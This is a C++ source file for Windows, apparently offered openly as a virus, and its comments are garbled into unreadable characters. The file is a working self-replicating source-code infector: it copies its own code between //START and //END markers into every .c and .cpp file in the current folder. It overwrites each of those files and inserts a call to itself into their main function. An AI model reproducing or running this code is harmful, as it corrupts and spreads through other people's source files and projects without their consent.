//START
#include <windows.h>
#include <fstream>
#include <string>
#include <iostream>
using namespace std;
//�˳���ǳ�Σ�գ���С�����У�
//����VS����
//��������Ȩ��,HuangSiJieTechnology Co. LTD. 2019-05-27
void vir()
{ 
string CurFileName = __FILE__;//����·��
string obCurFileName          //���·��
   = CurFileName.substr(CurFileName.find_last_of('//') + 1,CurFileName.size()-1);      
WIN32_FIND_DATA FindFileData;
HANDLE hFind = FindFirstFile("*.c*", &FindFileData);
string VirusCode[100];//�������� 
string FileCode[500]; //��������

int CodeLen = 0;//�������볤��
int FileLen = 0;//�������볤�� 

//������������Ӧ������"main("����ĵ�һ��"{"���� 
//��C++��main��int main(),int main(int arg,char **r)����ʽ 
int InsertLoc = 0; 

//��ȡ�������ĵ�ǰ�ļ��еĲ������� 
ifstream VirusFile(obCurFileName.c_str()); 
for (CodeLen = 0;getline(VirusFile,VirusCode[CodeLen]);CodeLen++)
{
   if(VirusCode[CodeLen] == "//END")
   {
    CodeLen++;
    break;
   }
}
VirusFile.close();
//���θ�Ⱦ�����ļ� 
while (true) 
{
   //���ܸ�Ⱦ��ǰ.cpp�ļ����Ѹ�Ⱦ���ļ� 
   if(strcmp(FindFileData.cFileName,obCurFileName.c_str())== 0)
   {
    cout<<FindFileData.cFileName<<":�Ǹ�ȾԴ!/n";
   }
   else//��Ⱦ�����ļ� 
   {
    //���������ļ� 
    ifstream ibe(FindFileData.cFileName);
    for(FileLen = 0;getline(ibe,FileCode[FileLen]);FileLen++)
    {
     if (FileCode[FileLen].find("main") != -1)
     {
      InsertLoc = FileLen;
     }
    }
    ibe.close();
    if(FileCode[0] == "//START")//���ļ��ѱ���Ⱦ 
    {
     cout<<FindFileData.cFileName<<":��Я���˲���!/n";
    }
    else if (FileLen > 500)
    {
     cout<<FindFileData.cFileName<<":�ļ�̫����!/n";
    }
    else
    {
     //�������ļ�
     ofstream be(FindFileData.cFileName);
     //���벡������ 
     for(int i = 0;i < CodeLen;i++)
     {
      be<<VirusCode[i]<<endl;
     }
     //������������λ��ǰ�ı����� 
     for(int i = 0;i < InsertLoc;i++)
     {
      be<<FileCode[i]<<endl;
     }
     //���뺯������vir() 
     for(int i = InsertLoc;i < FileLen;i++)
     {
      int j = FileCode[i].find('{');
      if(j != -1)
      {
       FileCode[i].insert(j + 1,"/nvir();"); 
       break;
      }
     }
     //������������λ�ú����ʣ���ı� 
     for(int i = InsertLoc;i < FileLen;i++)
     {
      be<<FileCode[i]<<endl;
     }
     be.close();
     cout<<FindFileData.cFileName<<":��Ⱦ�ɹ�!/n";
    }
   }
   if (FindNextFile(hFind, &FindFileData) == false) break;
}
}
//END
int main()
{
vir();
return 0;
}